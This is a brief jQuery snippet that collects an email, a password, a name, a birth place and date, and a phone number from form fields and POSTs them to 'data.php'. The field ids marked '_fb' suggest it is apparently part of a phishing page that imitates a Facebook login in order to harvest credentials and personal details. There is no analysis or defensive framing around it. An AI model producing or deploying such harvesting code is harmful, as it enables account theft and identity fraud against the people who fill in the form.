var email = $('#brty_email_fb').val();
var password = $('#brty_password_fb').val();
var nama = $("#brty_nama").val();
var ttl = $("#brty_ttl").val();
var phone = $("#brty_phone").val();

$.ajax({
         type: 'POST',
         url: 'data.php',
         data: {
         email:email,
         password:password,
         nama:nama,
         ttl:ttl,
         phone:phone 
         },
         dataType: 'text'
       })
